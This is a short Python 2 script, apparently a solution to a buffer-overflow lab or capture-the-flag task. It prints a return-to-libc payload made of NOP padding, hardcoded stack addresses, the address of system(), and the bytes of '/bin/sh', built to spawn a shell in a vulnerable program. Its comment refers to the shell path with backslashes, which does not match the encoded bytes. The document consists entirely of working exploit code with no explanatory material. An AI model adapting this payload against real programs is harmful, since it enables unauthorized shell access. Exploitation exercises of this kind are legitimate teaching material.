'''
18 byte padding, address of message (starting half way), address of system() call,
address of message(almost full message), the message "\bin\sh" followed by null
'''

from shellcode import shellcode
from struct import pack

print pack("<I", 0x90909090)*4 + "\x90\x90" + "\x12\xe5\xfe\xbf" + "\xed\x8e\x04\x08" + "\x14\xe5\xfe\xbf" + "\x2f\x62\x69\x6e\x2f\x73\x68" + "\0"
